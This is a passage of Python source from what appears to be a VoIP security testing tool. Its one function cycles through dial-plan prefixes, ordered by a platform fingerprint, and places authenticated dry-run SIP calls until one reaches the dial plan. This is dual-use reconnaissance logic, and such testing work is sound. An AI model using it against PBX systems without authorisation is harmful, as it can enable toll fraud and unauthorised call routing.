    source_ip: str = "",
    source_port_range: tuple[int, int] | None = None,
    prefixes: list[str] | None = None,
    fingerprint: str = "",
) -> tuple[str | None, str]:
    """Try dial-plan prefixes until one produces a provisional response.

    Returns (winning_prefix, full_destination) or (None, call_to) if none work.
    Pass fingerprint= to use platform-tuned prefix ordering.
    """
    if prefixes is None:
        prefixes = prefixes_for_fingerprint(fingerprint) if fingerprint else DIALPLAN_PREFIXES

    for prefix in prefixes:
        dest = f"{prefix}{call_to}" if prefix else call_to
        result = place_call(
            host, dest, call_from,
            port=port, username=username, password=password,
            timeout=timeout, dry_run=True, max_wait=timeout + 2.0,
            traffic_log=traffic_log,
            source_ip=source_ip, source_port_range=source_port_range,
        )
        if result.reached_dialplan:
            return prefix, dest

    return None, call_to
